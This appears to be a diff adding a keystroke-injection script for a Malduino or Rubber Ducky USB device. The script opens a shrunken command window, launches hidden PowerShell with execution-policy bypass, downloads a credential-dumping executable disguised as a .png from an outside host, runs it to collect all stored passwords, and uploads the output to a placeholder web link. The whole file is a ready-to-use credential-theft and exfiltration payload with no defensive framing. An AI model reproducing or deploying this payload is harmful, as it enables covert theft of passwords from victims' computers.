@@ -1,0 +1,10 @@
+REM Opens lazagne, saves output to PHP file on webserver. https://github.com/mundungus443/malduino-scripts/blob/master/scripts/1101.txt
+DELAY 2000
+GUI r
+DELAY 1000
+STRING cmd.exe /T:01 /K mode CON: COLS=17 LINES=1
+ENTER
+DELAY 1000
+STRING powershell -NoP -NonI -Window Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile(\"http://pwningstuff.000webhostapp.com/executables/laz.png\",\"$env:temp\laz.exe\"); $output = & $env:temp\laz.exe all | Out-String
+STRING ; (New-Object Net.WebClient).UploadString('YOUR_PHP_LINK', $output)"
+ENTER
